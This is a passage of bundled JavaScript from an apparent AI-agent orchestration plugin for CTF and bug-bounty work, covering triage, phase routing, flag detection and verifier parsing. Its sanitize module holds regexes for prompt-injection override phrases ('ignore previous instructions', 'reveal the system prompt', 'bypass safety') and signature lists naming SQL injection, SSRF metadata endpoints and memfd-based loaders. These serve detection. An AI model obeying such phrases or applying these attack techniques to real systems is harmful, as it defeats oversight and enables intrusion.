      ".got.plt",
      ".init",
      ".fini",
      ".init_array",
      ".fini_array",
      ".ctors",
      ".dtors",
      ".eh_frame",
      ".eh_frame_hdr",
      ".gcc_except_table",
      ".interp",
      ".hash",
      ".gnu.hash",
      ".gnu.version",
      ".gnu.version_r",
      ".note.ABI-tag",
      ".note.gnu.build-id",
      ".note.gnu.property",
      ".tbss",
      ".tdata",
      ".debug_info",
      ".debug_abbrev",
      ".debug_line",
      ".debug_str",
      ".debug_ranges",
      ".debug_loc",
      ".debug_frame"
    ]);
    const sectionNameRe = /\[\s*\d+\]\s+(\S+)/g;
    let match;
    while ((match = sectionNameRe.exec(readelfSections)) !== null) {
      const name = match[1];
      if (!standardSections.has(name) && !name.startsWith(".debug_") && !name.startsWith(".note.")) {
        hasCustomSections = true;
        signals.push(`custom_section:${name}`);
      }
    }
    if (/\.rela\.p|\.sym\.p|\.rel\.x|\.rela\.x/i.test(readelfSections)) {
      hasAbnormalRela = true;
      signals.push("abnormal_rela_section");
    }
  }
  if (readelfRelocs) {
    const relocCount = (readelfRelocs.match(/R_X86_64_RELATIVE|R_386_RELATIVE/g) || []).length;
    if (relocCount > 50) {
      hasAbnormalRela = true;
      signals.push(`excessive_relative_relocs:${relocCount}`);
    }
    if (/type=38|R_X86_64_NONE.*addend=0/i.test(readelfRelocs)) {
      hasAbnormalRela = true;
      signals.push("suspicious_reloc_type");
    }
  }
  if (stringsOutput) {
    const elfMagicCount = (stringsOutput.match(/\x7fELF/g) || []).length;
    if (elfMagicCount >= 2) {
      hasEmbeddedElf = true;
      signals.push(`embedded_elf_count:${elfMagicCount}`);
    }
    if (/fexecve|memfd_create/i.test(stringsOutput)) {
      hasEmbeddedElf = true;
      signals.push("memfd_fexecve_detected");
    }
  }
  return { hasAbnormalRela, hasCustomSections, hasEmbeddedElf, signals };
}
function shouldForceRelocPatchDump(indicator) {
  if (indicator.hasAbnormalRela && indicator.hasEmbeddedElf)
    return true;
  if (indicator.hasAbnormalRela && indicator.hasCustomSections)
    return true;
  return indicator.signals.length >= 3;
}
function triageFile(filePath, fileOutput) {
  const detectedType = detectFileType(filePath, fileOutput);
  const suggestedTarget = suggestTarget(detectedType);
  const commands = generateTriageCommands(filePath, detectedType);
  const immediateCount = commands.filter((command) => command.phase === 1).length;
  const conditionalCount = commands.length - immediateCount;
  const summary = [
    `File: ${filePath}`,
    `Detected type: ${detectedType}`,
    `Suggested target: ${suggestedTarget}`,
    `Commands: ${immediateCount} immediate${conditionalCount > 0 ? `, ${conditionalCount} conditional` : ""}`
  ].join(`
`);
  return {
    filePath,
    detectedType,
    suggestedTarget,
    commands,
    summary
  };
}

// src/orchestration/signal-actions.ts
function buildSignalGuidance(state, config2 = OrchestratorConfigSchema.parse({})) {
  const lines = [];
  if (state.revVmSuspected || state.revLoaderVmDetected) {
    lines.push("\u26A0 REV VM DETECTED: Static analysis is unreliable. Use ctf_rev_loader_vm_detect to map the VM and ctf_rev_entry_patch for dynamic extraction.");
  }
  if (state.decoySuspect) {
    const reason = state.decoySuspectReason ? ` (${state.decoySuspectReason})` : "";
    lines.push(`\u26A0 DECOY SUSPECT${reason}: Current flag candidate may be a decoy. Run ctf_decoy_guard to verify before submitting.`);
  }
  if (state.contradictionArtifactLockActive) {
    lines.push("\u26A0 CONTRADICTION ACTIVE: Patch-and-dump extraction is mandatory. Use ctf_rev_entry_patch to extract runtime state.");
  }
  if (state.contradictionSLADumpRequired) {
    lines.push("\u26A0 CONTRADICTION SLA: Direct state extraction required within this dispatch. Do not skip ctf_rev_entry_patch.");
  }
  if (state.noNewEvidenceLoops >= 2) {
    lines.push(`\u26A0 STUCK: No new evidence for ${state.noNewEvidenceLoops} loops. Change approach \u2014 use ctf_hypothesis_register to record alternatives.`);
  }
  if (state.revRiskScore > 0.3) {
    const signals = state.revRiskSignals.length > 0 ? ` signals=[${state.revRiskSignals.join(", ")}]` : "";
    lines.push(`\u26A0 HIGH REV RISK (score=${state.revRiskScore.toFixed(2)})${signals}: Prioritize dynamic analysis over static assumptions.`);
  }
  if (state.verifyFailCount >= 2) {
    lines.push(`\u26A0 REPEATED VERIFY FAILURES (${state.verifyFailCount}x): Consider whether the candidate is a decoy or constraints are wrong.`);
  }
  if (state.toolCallCount > 20 && state.aegisToolCallCount === 0) {
    lines.push("\u26A0 AEGIS TOOLS NOT USED: You have made many tool calls without using any Aegis orchestration tools. Run ctf_orch_status to check state, then use ctf_orch_event to advance the phase.");
  }
  const playbookNextAction = findPlaybookNextAction(state, config2);
  if (playbookNextAction && lines.length > 0) {
    lines.push(`PLAYBOOK NEXT ACTION (rule=${playbookNextAction.ruleId}): tool=${playbookNextAction.tool ?? "-"} route=${playbookNextAction.route ?? "-"}`);
  }
  return lines;
}
function buildPhaseInstruction(state) {
  switch (state.phase) {
    case "SCAN":
      return "PHASE INSTRUCTION (SCAN): Analyze the target and identify its type. " + "Use ctf_auto_triage to classify the target. " + "When analysis is complete, call: ctf_orch_event scan_completed";
    case "PLAN":
      return "PHASE INSTRUCTION (PLAN): Form hypotheses and build a TODO list. " + "Use ctf_hypothesis_register to record your hypotheses. " + "When the plan is ready, call: ctf_orch_event plan_completed";
    case "EXECUTE":
      return "PHASE INSTRUCTION (EXECUTE): Execute the in_progress TODO items. " + "Use ctf_evidence_ledger to record evidence. " + "When a flag candidate is found, call: ctf_orch_event candidate_found";
    case "VERIFY":
      return "PHASE INSTRUCTION (VERIFY): Validate the flag candidate against the oracle. " + "On success call: ctf_orch_event verify_success \u2014 On failure call: ctf_orch_event verify_fail";
    case "SUBMIT":
      return "PHASE INSTRUCTION (SUBMIT): Submit the verified flag.";
    default:
      return "";
  }
}

// src/orchestration/tool-guide.ts
function buildToolGuide(state) {
  const lines = ["AEGIS TOOLS (use these to orchestrate):"];
  lines.push("  ctf_orch_status          \u2014 show current orchestration state");
  lines.push("  ctf_orch_event <event>   \u2014 advance phase (scan_completed/plan_completed/candidate_found/verify_success/verify_fail)");
  switch (state.phase) {
    case "SCAN":
      lines.push("  ctf_auto_triage          \u2014 auto-classify target type");
      lines.push("  ctf_flag_scan            \u2014 scan output for flag patterns");
      lines.push("  ctf_recon_pipeline       \u2014 generate recon pipeline");
      break;
    case "PLAN":
      lines.push("  ctf_hypothesis_register  \u2014 register hypotheses and experiments");
      lines.push("  ctf_orch_exploit_template_list \u2014 list exploit templates");
      lines.push("  ctf_orch_event <event>   \u2014 set hypothesis via args.hypothesis");
      break;
    case "EXECUTE":
      lines.push("  ctf_evidence_ledger      \u2014 record/query evidence");
      lines.push("  ctf_decoy_guard          \u2014 check if candidate is a decoy");
      if (state.targetType === "REV") {
        lines.push("  ctf_rev_loader_vm_detect \u2014 detect relocation-based VM");
        lines.push("  ctf_rev_entry_patch      \u2014 patch entry for dynamic extraction");
        lines.push("  ctf_rev_base255_codec    \u2014 encode/decode base255");
      }
      if (state.targetType === "PWN") {
        lines.push("  ctf_env_parity           \u2014 check environment parity");
      }
      break;
    case "VERIFY":
      lines.push("  ctf_decoy_guard          \u2014 verify candidate is not a decoy");
      lines.push("  ctf_flag_scan            \u2014 rescan for flag patterns");
      break;
  }
  if (state.mode === "CTF") {
    lines.push("  ctf_delta_scan           \u2014 scan for changes since last run");
    lines.push("  ctf_report_generate      \u2014 generate final write-up");
  }
  return lines.join(`
`);
}

// src/risk/sanitize.ts
function normalizeWhitespace(input) {
  return input.replace(/\s+/g, " ").trim();
}
function stripAnsi(input) {
  return input.replace(/\x1B\[[0-9;]*m/g, "");
}
function sanitizeCommand(input) {
  return normalizeWhitespace(stripAnsi(input));
}
function isLikelyTimeout(output) {
  const text = output.toLowerCase();
  return text.includes("timed out") || text.includes("timeout") || text.includes("deadline exceeded");
}
function isContextLengthFailure(output) {
  const text = output.toLowerCase();
  return text.includes("context_length_exceeded") || text.includes("maximum context length") || text.includes("invalid_request_error") || text.includes("messageoutputlengtherror");
}
function isTokenOrQuotaFailure(output) {
  const text = output.toLowerCase();
  return text.includes("insufficient_quota") || text.includes("quota exceeded") || text.includes("out of credits") || text.includes("token limit") || text.includes("rate limit") || text.includes("rate_limit_exceeded") || text.includes("status 429") || text.includes("provider model not found") || text.includes("providermodelnotfounderror");
}
function isRetryableTaskFailure(output) {
  return isContextLengthFailure(output) || isLikelyTimeout(output) || isTokenOrQuotaFailure(output);
}
function classifyFailureReason(output) {
  const text = output.toLowerCase();
  if (/(?:\bunsat\b|unsatisfiable|unsatisfiable\s+constraints|constraints\s+unsat)/i.test(text)) {
    return "unsat_claim";
  }
  if (/(?:static\s*\/\s*dynamic|static\s+analysis|dynamic\s+analysis|runtime).*?(?:contradict|mismatch|inconsistent)|(?:contradict|mismatch|inconsistent).*?(?:static\s*\/\s*dynamic|static\s+analysis|dynamic\s+analysis|runtime)/i.test(text)) {
    return "static_dynamic_contradiction";
  }
  if (isContextLengthFailure(output)) {
    return "context_overflow";
  }
  if (isLikelyTimeout(output) || isTokenOrQuotaFailure(output)) {
    return "tooling_timeout";
  }
  if (isVerifyFailure(output)) {
    return "verification_mismatch";
  }
  if (/(segmentation fault|sigsegv|stack smashing|core dumped|double free|abort trap|assertion failed|fatal signal|crash)/i.test(text)) {
    return "exploit_chain";
  }
  if (/(permission denied|operation not permitted|no such file|command not found|failed to spawn|exec format error|connection refused)/i.test(text)) {
    return "environment";
  }
  if (/(no new evidence|no-new-evidence|same payload|same-payload|inconclusive|\bhypothesis\s+stall\b|\bstuck\b)/i.test(text)) {
    return "hypothesis_stall";
  }
  return null;
}
var INJECTION_PATTERNS = [
  { id: "ignore_instructions", pattern: /ignore\s+(all\s+)?(previous|prior|system|developer)\s+instructions/i },
  { id: "reveal_prompt", pattern: /(show|reveal|print|dump)\s+(the\s+)?(system|developer)\s+prompt/i },
  { id: "prompt_override", pattern: /(you\s+must|do\s+exactly|follow\s+only)\s+.*(instead|not\s+the\s+rules)/i },
  { id: "exact_command", pattern: /run\s+this\s+exact\s+command/i },
  { id: "policy_bypass", pattern: /bypass\s+(safety|policy|guardrail|restriction)/i }
];
function detectInjectionIndicators(text) {
  if (!text || text.trim().length === 0) {
    return [];
  }
  const matches = [];
  for (const item of INJECTION_PATTERNS) {
    if (item.pattern.test(text)) {
      matches.push(item.id);
    }
  }
  return matches;
}
function isVerificationSourceRelevant(toolName, title, options) {
  const normalizedToolName = toolName.toLowerCase();
  const normalizedTitle = (title ?? "").toLowerCase();
  const markerMatchedInTitle = options.verifierTitleMarkers.some((marker) => normalizedTitle.includes(marker.toLowerCase()));
  const isConfiguredVerifierTool = options.verifierToolNames.some((name) => name.toLowerCase() === normalizedToolName);
  if (!isConfiguredVerifierTool) {
    return markerMatchedInTitle;
  }
  if (normalizedToolName === "task" || normalizedToolName === "bash") {
    return markerMatchedInTitle;
  }
  return true;
}
var FLAG_EVIDENCE_PATTERNS = [
  /flag\{[^}\s]{1,200}\}/i,
  /ctf\{[^}\s]{1,200}\}/i,
  /picoctf\{[^}\s]{1,200}\}/i,
  /htb\{[^}\s]{1,200}\}/i,
  /tctf\{[^}\s]{1,200}\}/i,
  /seccon\{[^}\s]{1,200}\}/i,
  /asis\{[^}\s]{1,200}\}/i,
  /cctf\{[^}\s]{1,200}\}/i,
  /hxp\{[^}\s]{1,200}\}/i,
  /pctf\{[^}\s]{1,200}\}/i,
  /dice\{[^}\s]{1,200}\}/i,
  /uiuctf\{[^}\s]{1,200}\}/i,
  /ictf\{[^}\s]{1,200}\}/i,
  /actf\{[^}\s]{1,200}\}/i,
  /zer0pts\{[^}\s]{1,200}\}/i
];
var FAKE_PLACEHOLDER_RE = /(?:fake|placeholder|example|sample|dummy|mock|test[_-]?flag|not[_-]?real|decoy)/i;
function hasPlaceholderPayload(value) {
  const trimmed = value.trim();
  if (!trimmed) {
    return false;
  }
  const openBrace = trimmed.indexOf("{");
  const payload = openBrace >= 0 && trimmed.endsWith("}") ? trimmed.slice(openBrace + 1, -1) : trimmed;
  return FAKE_PLACEHOLDER_RE.test(payload);
}
function isLowConfidenceCandidate(candidate) {
  const trimmed = candidate.trim();
  if (!trimmed || trimmed.length < 6 || trimmed.length > 220) {
    return true;
  }
  const openBrace = trimmed.indexOf("{");
  const payload = openBrace >= 0 && trimmed.endsWith("}") ? trimmed.slice(openBrace + 1, -1) : trimmed;
  if (FAKE_PLACEHOLDER_RE.test(payload)) {
    return true;
  }
  const hasWhitespace = /\s/.test(trimmed);
  const hasBalancedBraces = trimmed.includes("{") && trimmed.endsWith("}");
  if (!hasBalancedBraces || hasWhitespace) {
    return true;
  }
  return false;
}
function extractVerifierEvidence(output, candidate) {
  const text = normalizeWhitespace(stripAnsi(output));
  const normalizedCandidate = (candidate ?? "").trim();
  if (normalizedCandidate.length > 0 && text.includes(normalizedCandidate) && !hasPlaceholderPayload(normalizedCandidate)) {
    return normalizedCandidate;
  }
  for (const pattern of FLAG_EVIDENCE_PATTERNS) {
    const match = text.match(pattern);
    const raw = match?.[0]?.trim() ?? "";
    if (raw.length > 0 && !hasPlaceholderPayload(raw)) {
      return raw;
    }
  }
  return null;
}
function hasVerifierEvidence(output, candidate) {
  return extractVerifierEvidence(output, candidate) !== null;
}
var VERIFY_FAIL_STRICT_RE = /\b(?:wrong\s+answer|invalid\s+flag|rejected|incorrect|not\s+(?:flag\s+)?accepted|unaccepted|not\s+correct)\b/i;
var VERIFY_FAIL_GENERIC_RE = /\b(?:wrong!?|wrong\s+answer|incorrect|rejected|invalid\s+flag)\b/i;
var VERIFY_SUCCESS_STRICT_RE = /\b(?:flag\s+accepted|accepted!|correct!?)\b/i;
var VERIFY_SUCCESS_GENERIC_RE = /\b(?:accepted|correct!?)\b/i;
var VERIFY_SUCCESS_ORACLE_RE = /\b(?:correct!?|flag\s+accepted|accepted!?)\b/i;
var ACCEPTANCE_EVIDENCE_RE = /\b(?:accepted!?|correct!?|flag\s+accepted|checker\s+(?:ok|passed|success)|judge\s+(?:ok|passed|success)|scoreboard\s+(?:ok|passed|success)|submission\s+(?:ok|accepted|passed))\b/i;
var EXIT_CODE_ZERO_RE = /\b(?:exit(?:ed)?\s*(?:with)?\s*(?:code|status)?\s*[:=]?\s*0|return\s*code\s*[:=]?\s*0|rc\s*[:=]\s*0|status\s*[:=]\s*0)\b/i;
var RUNTIME_EVIDENCE_RE = /\b(?:docker|container|remote\s+runtime|remote\s+checker|challenge\s+host)\b/i;
function hasVerifyOracleSuccess(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  if (VERIFY_FAIL_STRICT_RE.test(text)) {
    return false;
  }
  return VERIFY_SUCCESS_ORACLE_RE.test(text);
}
function hasExitCodeZeroEvidence(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return EXIT_CODE_ZERO_RE.test(text);
}
function hasRuntimeEvidence(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return RUNTIME_EVIDENCE_RE.test(text);
}
function hasAcceptanceEvidence(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  if (VERIFY_FAIL_STRICT_RE.test(text)) {
    return false;
  }
  return ACCEPTANCE_EVIDENCE_RE.test(text);
}
var REV_VM_RISK_PATTERNS = [
  { signal: "rela_p", re: /\.rela\.p\b/i, weight: 0.35 },
  { signal: "sym_p", re: /\.sym\.p\b/i, weight: 0.2 },
  {
    signal: "reloc_anomaly",
    re: /\b(?:abnormal|weird|invalid|custom|nonstandard)\b[^\n]{0,60}\breloc(?:ation)?s?\b|\breloc(?:ation)?s?\b[^\n]{0,60}\b(?:abnormal|weird|invalid|custom|nonstandard)\b/i,
    weight: 0.2
  },
  { signal: "rwx_segment", re: /\brwx\b|\bwx\b/i, weight: 0.15 },
  { signal: "self_mod", re: /\bself[-\s]?mod(?:ifying)?\b/i, weight: 0.25 },
  { signal: "vm_hint", re: /\bvirtual\s+machine\b|\bbytecode\s+vm\b|\binterpreter\s+loop\b/i, weight: 0.25 }
];
function assessRevVmRisk(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  let score = 0;
  const signals = [];
  for (const item of REV_VM_RISK_PATTERNS) {
    if (item.re.test(text)) {
      score += item.weight;
      signals.push(item.signal);
    }
  }
  const capped = Math.min(1, score);
  const vmSuspected = capped >= 0.35 || signals.includes("self_mod") || signals.includes("vm_hint");
  const staticTrust = Math.max(0.2, 1 - capped * 0.7);
  return {
    vmSuspected,
    score: Number(capped.toFixed(3)),
    signals,
    staticTrust: Number(staticTrust.toFixed(3))
  };
}
var WEB_RISK_PATTERNS = [
  { signal: "ssti", re: /\b(?:ssti|server[- ]side\s+template\s+injection|jinja2?|mako|twig|freemarker)\b/i, weight: 0.3 },
  { signal: "sqli", re: /\b(?:sql\s*inject|union\s+select|or\s+1\s*=\s*1|information_schema|sqlite_master)\b/i, weight: 0.3 },
  { signal: "ssrf", re: /\b(?:ssrf|server[- ]side\s+request|internal\s+(?:network|service)|169\.254\.169\.254|metadata\s+endpoint)\b/i, weight: 0.25 },
  { signal: "xss", re: /\b(?:xss|cross[- ]site\s+script|reflected\s+script|dom[- ]based)\b/i, weight: 0.15 },
  { signal: "lfi", re: /\b(?:local\s+file\s+inclu|path\s+traversal|directory\s+traversal|\.\.\/|\.\.\\)/i, weight: 0.25 },
  { signal: "deserialization", re: /\b(?:deserialization|pickle\.load|yaml\.load|unserialize|readObject)\b/i, weight: 0.3 },
  { signal: "auth_bypass", re: /\b(?:auth(?:entication)?\s*bypass|jwt\s*(?:forg|none\s*alg)|session\s*(?:fixat|hijack))\b/i, weight: 0.25 },
  { signal: "idor", re: /\b(?:idor|insecure\s+direct\s+object|broken\s+access\s+control)\b/i, weight: 0.2 }
];
var WEB3_RISK_PATTERNS = [
  { signal: "reentrancy", re: /\b(?:re-?entranc|call\s*\(\s*\)\s*\.value|\.call\{value)/i, weight: 0.35 },
  { signal: "oracle_manipulation", re: /\b(?:price\s*(?:oracle|manipulat|feed)|flash\s*loan\s*(?:attack|exploit))\b/i, weight: 0.3 },
  { signal: "access_control", re: /\b(?:onlyOwner|access\s*control|unauthorized|privilege\s*escalat)\b/i, weight: 0.2 },
  { signal: "storage_collision", re: /\b(?:storage\s*collision|delegatecall\s*(?:proxy|vuln)|slot\s*(?:conflict|overlap))\b/i, weight: 0.25 },
  { signal: "signature_replay", re: /\b(?:signature\s*replay|nonce\s*(?:reuse|missing)|ecrecover)\b/i, weight: 0.2 },
  { signal: "integer_overflow", re: /\b(?:integer\s*(?:overflow|underflow)|unchecked\s*(?:math|arith))\b/i, weight: 0.2 }
];
var CRYPTO_RISK_PATTERNS = [
  { signal: "weak_rsa", re: /\b(?:small\s*(?:e|exponent)|common\s*modulus|wiener|hastad|coppersmith|fermat\s*factor)\b/i, weight: 0.3 },
  { signal: "padding_oracle", re: /\b(?:padding\s*oracle|pkcs[#\s]*[17]|cbc\s*(?:padding|oracle))\b/i, weight: 0.3 },
  { signal: "ecb_mode", re: /\b(?:ecb\s*mode|ecb\s*(?:oracle|detect|penguin)|block\s*(?:cipher\s*)?ecb)\b/i, weight: 0.25 },
  { signal: "weak_hash", re: /\b(?:md5\s*(?:collision|crack)|sha1\s*collision|length\s*extension\s*attack)\b/i, weight: 0.2 },
  { signal: "weak_random", re: /\b(?:weak\s*random|predictable\s*(?:seed|nonce|iv)|mt19937|mersenne\s*twister)\b/i, weight: 0.25 },
  { signal: "known_plaintext", re: /\b(?:known[- ]plaintext|chosen[- ](?:plaintext|ciphertext)|cpa|cca)\b/i, weight: 0.2 }
];
var FORENSICS_RISK_PATTERNS = [
  { signal: "steganography", re: /\b(?:steganograph|lsb\s*(?:embed|extract|steg)|stegsolve|steghide|zsteg)\b/i, weight: 0.25 },
  { signal: "hidden_partition", re: /\b(?:hidden\s*partition|alternate\s*data\s*stream|ads|slack\s*space|unallocated)\b/i, weight: 0.25 },
  { signal: "timestamp_tamper", re: /\b(?:timestamp\s*(?:tamper|modif|forg)|timestomp|touch\s*-[tad])\b/i, weight: 0.2 },
  { signal: "memory_artifact", re: /\b(?:volatility|memory\s*dump|crash\s*dump|hibernation\s*file|pagefile)\b/i, weight: 0.2 },
  { signal: "network_capture", re: /\b(?:pcap|wireshark|tshark|packet\s*capture|tcp\s*stream|http\s*stream)\b/i, weight: 0.2 },
  { signal: "file_carving", re: /\b(?:file\s*carv|foremost|scalpel|photorec|binwalk\s*-e|magic\s*bytes)\b/i, weight: 0.2 }
];
var MISC_RISK_PATTERNS = [
  { signal: "encoding_chain", re: /\b(?:base64|base32|base85|rot13|caesar|atbash|vigenere|hex\s*(?:decode|encode))\b/i, weight: 0.2 },
  { signal: "osint", re: /\b(?:osint|open\s*source\s*intelligen|geolocation|reverse\s*image|exif\s*gps)\b/i, weight: 0.2 },
  { signal: "esoteric_lang", re: /\b(?:brainfuck|whitespace|piet|malbolge|befunge|ook|jsfuck)\b/i, weight: 0.2 },
  { signal: "qr_barcode", re: /\b(?:qr\s*code|barcode|aztec\s*code|data\s*matrix)\b/i, weight: 0.15 },
  { signal: "logic_puzzle", re: /\b(?:logic\s*puzzle|constraint\s*satisf|z3\s*solver|sat\s*solver)\b/i, weight: 0.2 }
];
function assessPatterns(output, patterns, threshold) {
  const text = normalizeWhitespace(stripAnsi(output));
  let score = 0;
  const signals = [];
  for (const item of patterns) {
    if (item.re.test(text)) {
      score += item.weight;
      signals.push(item.signal);
    }
  }
  const capped = Math.min(1, score);
  return { score: Number(capped.toFixed(3)), signals, highRisk: capped >= threshold };
}
function assessWebRisk(output) {
  return assessPatterns(output, WEB_RISK_PATTERNS, 0.3);
}
function assessWeb3Risk(output) {
  return assessPatterns(output, WEB3_RISK_PATTERNS, 0.3);
}
function assessCryptoRisk(output) {
  return assessPatterns(output, CRYPTO_RISK_PATTERNS, 0.25);
}
function assessForensicsRisk(output) {
  return assessPatterns(output, FORENSICS_RISK_PATTERNS, 0.25);
}
function assessMiscRisk(output) {
  return assessPatterns(output, MISC_RISK_PATTERNS, 0.2);
}
function assessDomainRisk(targetType, output) {
  switch (targetType) {
    case "WEB_API":
      return assessWebRisk(output);
    case "WEB3":
      return assessWeb3Risk(output);
    case "CRYPTO":
      return assessCryptoRisk(output);
    case "FORENSICS":
      return assessForensicsRisk(output);
    case "MISC":
      return assessMiscRisk(output);
    default:
      return null;
  }
}
function isVerifySuccess(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  if (VERIFY_FAIL_STRICT_RE.test(text)) {
    return false;
  }
  return VERIFY_SUCCESS_STRICT_RE.test(text) || VERIFY_SUCCESS_GENERIC_RE.test(text);
}
function isVerifyFailure(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return VERIFY_FAIL_STRICT_RE.test(text) || VERIFY_FAIL_GENERIC_RE.test(text);
}
var INTERACTIVE_COMMAND_PATTERNS = [
  { id: "git_rebase_i", pattern: /\bgit\s+rebase\s+(-[a-zA-Z]*i|--interactive)\b/, reason: "git rebase -i opens an interactive editor" },
  { id: "git_add_i", pattern: /\bgit\s+add\s+(-[a-zA-Z]*i|--interactive|-[a-zA-Z]*p|--patch)\b/, reason: "git add -i/--patch opens interactive prompts" },
  { id: "git_commit_no_msg", pattern: /\bgit\s+commit\b(?!.*(-m\s|--message[ =]))/, reason: "git commit without -m opens an editor; use -m 'msg'" },
  { id: "editor_vim", pattern: /\b(vim?|nvim|nano|emacs|pico|joe|micro)\b/, reason: "Interactive editor detected; use non-interactive alternatives" },
  { id: "less_more", pattern: /\|\s*(less|more)\s*$/, reason: "Pager detected; output will hang. Remove pipe to less/more" },
  { id: "interactive_python", pattern: /\bpython3?\s*$/, reason: "Bare python opens REPL; provide a script or use -c" },
  { id: "interactive_node", pattern: /\bnode\s*$/, reason: "Bare node opens REPL; provide a script or use -e" },
  { id: "ssh_no_cmd", pattern: /\bssh\s+[^|;&]+$/, reason: "ssh without a command opens an interactive shell" },
  { id: "interactive_flag", pattern: /\b(bash|sh|zsh)\s+(-[a-zA-Z]*i|--interactive)\b/, reason: "Interactive shell flag detected" }
];
function detectInteractiveCommand(command) {
  const cleaned = sanitizeCommand(command);
  for (const entry of INTERACTIVE_COMMAND_PATTERNS) {
    if (entry.pattern.test(cleaned)) {
      return { id: entry.id, reason: entry.reason };
    }
  }
  return null;
}
function sanitizeThinkingBlocks(text) {
  if (!text || text.trim().length === 0) {
    return null;
  }
  let modified = false;
  let result = text;
  const openCount = (result.match(/<thinking>/gi) || []).length;
  const closeCount = (result.match(/<\/thinking>/gi) || []).length;
  if (openCount > closeCount) {
    const diff = openCount - closeCount;
    for (let i = 0;i < diff; i++) {
      result = `${result}
</thinking>`;
    }
    modified = true;
  }
  if (closeCount > openCount) {
    let surplus = closeCount - openCount;
    result = result.replace(/<\/thinking>/gi, (match) => {
      if (surplus > 0) {
        surplus--;
        return "";
      }
      return match;
    });
    modified = true;
  }
  const thinkingPrefixRe = /^(thinking:\s*)/i;
  if (thinkingPrefixRe.test(result.trimStart()) && !result.includes("<thinking>")) {
    result = result.replace(thinkingPrefixRe, "");
    modified = true;
  }
  return modified ? result : null;
}

// src/orchestration/router.ts
function isStuck(state, config2) {
  const now = Date.now();
  if (now - state.oracleProgressImprovedAt <= 10 * 60 * 1000) {
    return false;
  }
  const threshold = config2?.stuck_threshold ?? 2;
  return state.noNewEvidenceLoops >= threshold || state.samePayloadLoops >= threshold || state.verifyFailCount >= threshold;
}
function modeRouting(state, config2) {
  const routing = config2?.routing ?? DEFAULT_ROUTING;
  return state.mode === "CTF" ? routing.ctf : routing.bounty;
}
function allKnownRoutes(config2) {
  const routing = config2?.routing ?? DEFAULT_ROUTING;
  const domainKeys = ["scan", "plan", "execute", "stuck", "failover"];
  const routes = new Set;
  for (const mode of [routing.ctf, routing.bounty]) {
    for (const key of domainKeys) {
      for (const routeValue of Object.values(mode[key])) {
        routes.add(routeValue);
      }
    }
  }
  return routes;
}
function appendPlaybookRuleReason(reason, ruleId) {
  return `${reason} playbook_rule=${ruleId}`;
}
function contradictionPivotPrimary(state, config2) {
  const routing = modeRouting(state, config2);
  if (state.mode === "CTF") {
    switch (state.targetType) {
      case "PWN":
      case "REV":
        return "ctf-rev";
      case "WEB_API":
        return "ctf-web";
      case "WEB3":
        return "ctf-web3";
      case "CRYPTO":
        return "ctf-crypto";
      case "FORENSICS":
        return "ctf-forensics";
      default:
        return routing.scan[state.targetType];
    }
  }
  return routing.scan[state.targetType];
}
function hasActiveContradictionArtifactLock(state) {
  return state.contradictionArtifactLockActive && !state.contradictionPatchDumpDone;
}
function hasObservationEvidence(state) {
  return state.verifyFailCount > 0 || state.noNewEvidenceLoops > 0 || state.samePayloadLoops > 0 || state.readonlyInconclusiveCount > 0 || state.failureReasonCounts.verification_mismatch > 0 || state.failureReasonCounts.hypothesis_stall > 0 || state.failureReasonCounts.static_dynamic_contradiction > 0;
}
function routeForContextOverflowFailure(state, config2) {
  const routing = modeRouting(state, config2);
  if (state.phase === "EXECUTE") {
    return {
      primary: routing.stuck[state.targetType],
      reason: "EXECUTE context overflow: keep solving route primary and use md-scribe as followup for compaction.",
      followups: ["md-scribe"]
    };
  }
  if (state.mdScribePrimaryStreak >= 2) {
    return {
      primary: routing.stuck[state.targetType],
      reason: "md-scribe guard: repeated context compaction route reached limit, pivot to target-aware stuck route."
    };
  }
  return {
    primary: "md-scribe",
    reason: "Recent failure indicates context overflow: compact state and retry with smaller context.",
    followups: [routing.stuck[state.targetType]]
  };
}
function routeForVerificationMismatchFailure(state, config2) {
  const routing = modeRouting(state, config2);
  if (isStuck(state, config2)) {
    return {
      primary: routing.stuck[state.targetType],
      reason: "Repeated verification mismatches suggest a decoy or wrong constraints: stop re-verifying and pivot via stuck route."
    };
  }
  if (state.mode !== "CTF") {
    return {
      primary: "bounty-triage",
      reason: "Recent verification mismatch in BOUNTY: re-run minimal-impact reproducible triage before escalation."
    };
  }
  return {
    primary: "ctf-decoy-check",
    reason: "Recent verification mismatch: run decoy-check before next verification attempt.",
    followups: ["ctf-verify"]
  };
}
function routeForHypothesisStallFailure(state, config2) {
  const routing = modeRouting(state, config2);
  if (state.staleToolPatternLoops >= 3 && state.noNewEvidenceLoops > 0) {
    return {
      primary: state.mode === "CTF" ? "ctf-hypothesis" : routing.stuck[state.targetType],
      reason: "Stale hypothesis kill-switch: repeated same tool/subagent pattern without new evidence. Cancel current line and switch to extraction/transform hypothesis.",
      followups: [routing.stuck[state.targetType]]
    };
  }
  return {
    primary: routing.stuck[state.targetType],
    reason: "Repeated no-evidence loop detected: force pivot via stuck route."
  };
}
function routeForStaticDynamicContradictionFailure(state, config2) {
  const routing = modeRouting(state, config2);
  if (state.contradictionSLADumpRequired && !state.contradictionPatchDumpDone) {
    const slaGuidance = {
      REV: "Use patch-and-dump or equivalent runtime state extraction.",
      PWN: "Use dynamic debugging (gdb/strace) to capture runtime state.",
      WEB_API: "Capture raw HTTP request/response with different parameters to isolate the contradiction.",
      WEB3: "Deploy locally and trace state changes to identify the discrepancy.",
      CRYPTO: "Run with known test vectors to verify intermediate computation steps.",
      FORENSICS: "Use alternative extraction tools to cross-validate artifact contents.",
      MISC: "Run controlled experiments with modified inputs to isolate the inconsistency."
    };
    const guidance = slaGuidance[state.targetType] || "Run a direct state extraction experiment.";
    return {
      primary: contradictionPivotPrimary(state, config2),
      reason: `Contradiction SLA: direct evidence extraction is MANDATORY before further hypothesis cycling. ${guidance}`,
      followups: [routing.stuck[state.targetType]]
    };
  }
  if (hasActiveContradictionArtifactLock(state)) {
    return {
      primary: contradictionPivotPrimary(state, config2),
      reason: "Static/dynamic contradiction hard-trigger: extraction-first pivot is mandatory until artifact evidence is recorded.",
      followups: [routing.stuck[state.targetType]]
    };
  }
  return {
    primary: routing.stuck[state.targetType],
    reason: "Static/dynamic contradiction detected: force deep pivot via target stuck route."
  };
}
function routeForUnsatFailure(state, config2) {
